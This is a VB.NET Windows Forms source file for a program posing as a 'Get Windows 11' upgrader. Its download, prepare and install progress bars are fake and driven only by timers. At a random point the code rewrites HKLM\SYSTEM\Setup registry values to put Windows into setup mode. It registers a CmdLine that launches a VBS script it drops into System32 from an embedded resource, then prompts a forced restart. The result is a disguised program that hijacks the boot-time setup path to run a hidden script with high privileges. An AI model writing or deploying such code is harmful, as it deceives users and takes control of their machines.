Imports Microsoft.Win32
Imports Windows.Security.Isolation

Public Class Form1
    Dim regKey As RegistryKey
    Dim StopNumber As Integer
    Dim Result As DialogResult
    Dim ver As Decimal

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        DownloadTimer.Start()
        Button1.Enabled = False
    End Sub

    Private Sub DownloadTimer_Tick(sender As Object, e As EventArgs) Handles DownloadTimer.Tick
        DownloadProgress.Value += 1
        Label3.Text = DownloadProgress.Value & "%"
        If DownloadProgress.Value = DownloadProgress.Maximum Then
            DownloadTimer.Stop()
            RadioButton1.Checked = True
            PrepareTimer.Start()
        End If
    End Sub

    Private Sub PrepareTimer_Tick(sender As Object, e As EventArgs) Handles PrepareTimer.Tick
        PrepareProgress.Value += 1
        Label4.Text = PrepareProgress.Value & "%"
        If PrepareProgress.Value = PrepareProgress.Maximum Then
            PrepareTimer.Stop()
            RadioButton2.Checked = True
            InstallTimer.Start()
        End If
    End Sub

    Private Sub InstallTimer_Tick(sender As Object, e As EventArgs) Handles InstallTimer.Tick
        InstallProgress.Value += 1
        Label5.Text = InstallProgress.Value & "%"
        If InstallProgress.Value = StopNumber Then
            regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\Setup", True)
            regKey.SetValue("OOBEInProgress", 1)
            regKey.SetValue("SetupPhase", 4)
            regKey.SetValue("SystemSetupInProgress", 1)
            regKey.SetValue("SetupType", 2)
            regKey.SetValue("CmdLine", "cmd.exe /c reg add HKLM\System\Setup /v SystemSetupInProgress /d 0 /t REG_DWORD /f&&reg add HKLM\System\Setup /v SetupType /d 0 /t REG_DWORD /f&&reg add HKLM\System\Setup /v CmdLine /f&&start C:\Windows\System32\vbFailure.vbs")
            My.Computer.FileSystem.WriteAllText("C:\Windows\System32\vbFailure.vbs", My.Resources.vbFailure, True)
            Result = MsgBox("You need to restart the computer to finish installing Windows 11. Please make sure you saved all your files. Do you want to restart now?", vbYesNo + vbQuestion, "Get Windows 11")
            If Result = DialogResult.No Then
                Me.Hide()
                Me.Close()
            ElseIf Result = DialogResult.Yes Then
                System.Diagnostics.Process.Start("Shutdown", "/r /t 0 /f")
            End If
        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Randomize()
        StopNumber = CInt(Int((45 * Rnd()) + 35))
    End Sub
End Class
